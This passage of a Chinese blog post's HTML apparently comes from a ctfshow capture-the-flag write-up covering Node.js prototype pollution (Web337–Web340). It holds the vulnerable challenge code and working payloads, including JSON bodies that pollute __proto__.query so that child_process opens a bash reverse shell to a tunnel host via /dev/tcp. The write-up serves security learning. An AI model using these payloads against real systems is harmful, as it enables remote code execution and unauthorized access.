+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="o">===</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="o">!==</span><span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">flag</span><span class="p">)</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nx">b</span><span class="o">+</span><span class="nx">flag</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  	<span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,{</span> <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;tql&#39;</span><span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和php差不多</p>
+<p><img src="/p/nodejs/image-20250726122701847.png"
+	width="1214"
+	height="400"
+	srcset="/p/nodejs/image-20250726122701847_hu6068629890761976684.png 480w, /p/nodejs/image-20250726122701847_hu9205425830615367881.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726122701847"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="728px"
+	
+></p>
+<h3 id="web338">Web338
+</h3><h4 id="考点原型链污染">考点：原型链污染
+</h4><p>源码要求secert的ctfshow参数的值为36dboy</p>
+<p><img src="/p/nodejs/image-20250726123325856.png"
+	width="1152"
+	height="556"
+	srcset="/p/nodejs/image-20250726123325856_hu17459453713697409586.png 480w, /p/nodejs/image-20250726123325856_hu5090130233930139726.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726123325856"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+></p>
+<p>我们登录页面是用JSON的形式传的，可以在这里传入secret的原型，改变原型的ctfshow的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;__proto__&#34;:{&#34;ctfshow&#34;:&#34;36dboy&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/nodejs/image-20250726123704234.png"
+	width="1292"
+	height="727"
+	srcset="/p/nodejs/image-20250726123704234_hu14892299261987363150.png 480w, /p/nodejs/image-20250726123704234_hu9897566516027894753.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726123704234"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<h3 id="web339">Web339
+</h3><h4 id="考点原型链污染反弹shell">考点：原型链污染反弹shell
+</h4><p>有源码，但是我们无法像上题一样直接通过proto修改源码的值，之前是因为没有ctfshow这个值，所以会向上寻找，我们污染了原型就能成功。</p>
+<p>这里是因为本身是有secert.ctfshow这个属性的，所以并不会向上寻找，我们污染原型也米有用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">).</span><span class="nx">json</span><span class="p">(),</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">flag</span><span class="o">=</span><span class="s1">&#39;flag_here&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">secert</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">utils</span><span class="p">.</span><span class="nx">copy</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">//console.log(user.query)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">secert</span><span class="p">.</span><span class="nx">ctfshow</span><span class="o">===</span><span class="nx">flag</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="nx">ret_code</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ret_msg</span><span class="o">:</span> <span class="s1">&#39;登录失败&#39;</span><span class="o">+</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">user</span><span class="p">)});</span>  
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这题有个api.js</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;body-parser&#39;</span><span class="p">).</span><span class="nx">json</span><span class="p">(),</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">query</span><span class="o">:</span> <span class="nb">Function</span><span class="p">(</span><span class="nx">query</span><span class="p">)(</span><span class="nx">query</span><span class="p">)});</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以通过原型链控制这个query，使这个query的值最后可以执行我们的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="p">:{</span><span class="s2">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c </span><span class="se">\&#34;</span><span class="s2">bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/13786 0&gt;&amp;1</span><span class="se">\&#34;</span><span class="s2">&#39;)&#34;</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在/login发完包之后要进一下/api，不然不会执行这段代码</p>
+<p>（这里反弹shell我用的是Cpolar内网穿透，这样就不用搞服务器了）</p>
+<p><img src="/p/nodejs/image-20250726150554543.png"
+	width="2168"
+	height="966"
+	srcset="/p/nodejs/image-20250726150554543_hu1534330158627774688.png 480w, /p/nodejs/image-20250726150554543_hu3036703105997071278.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726150554543"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="224"
+		data-flex-basis="538px"
+	
+></p>
+<h3 id="web340">Web340
+</h3><h4 id="考点二次链原型链污染反弹shell">考点：二次链原型链污染反弹shell
+</h4><p>和上题差不多，直接污染两层就行</p>
+<p><img src="/p/nodejs/image-20250726124126378.png"
+	width="514"
+	height="190"
+	srcset="/p/nodejs/image-20250726124126378_hu14646008923451821952.png 480w, /p/nodejs/image-20250726124126378_hu5060693779925664290.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250726124126378"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="270"
+		data-flex-basis="649px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;__proto__&#34;</span><span class="p">:{</span><span class="s2">&#34;__proto__&#34;</span><span class="p">:{</span><span class="s2">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c </span><span class="se">\&#34;</span><span class="s2">bash -i &gt;&amp; /dev/tcp/6.tcp.cpolar.top/13786 0&gt;&amp;1</span><span class="se">\&#34;</span><span class="s2">&#39;)&#34;</span><span class="p">}}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后续的题目都是围绕ejs模板漏洞，也对，是nodejs的题目，又不是原型链污染的题目。不过这里主要是想学习原型链污染，这里就先写道这里。</p>
+<h2 id="小结">小结
+</h2><p>有点小失望，我以为ctfshow里的题目会挺好的，感觉不符合预期。不过也是学到了一些东西，对原型链污染的理解更深刻了，然后发现了一种新的反弹shell的方法，挺不错的。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
